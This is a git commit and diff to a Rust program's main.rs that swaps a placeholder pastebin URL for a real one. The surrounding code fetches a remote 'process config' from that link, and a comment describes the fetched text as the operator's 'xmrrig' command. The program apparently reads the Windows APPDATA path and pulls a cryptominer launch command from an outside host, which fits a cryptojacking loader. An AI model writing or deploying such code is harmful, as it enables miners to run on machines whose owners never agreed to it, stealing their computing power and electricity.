236fd5771cc40305940b6a1e588b99d68fb506ce
husuario420 <husuario420@protonmail.com>
2025-01-12 02:29:52 -0600

    pastebin url add

--- src/main.rs
+++ src/main.rs
@@ -60,7 +60,7 @@ fn main() {
         std::env::var("APPDATA").unwrap_or_default());
 
     let client = reqwest::blocking::Client::new();
-    let process_config = client.get("https://pastebin.com/raw/yoururl")//replace with your pastebin link with your xmrrig comamnd
+    let process_config = client.get("https://pastebin.com/raw/RxFQnBZ3")//replace with your pastebin link with your xmrrig comamnd
         .send()
         .unwrap()
         .text()
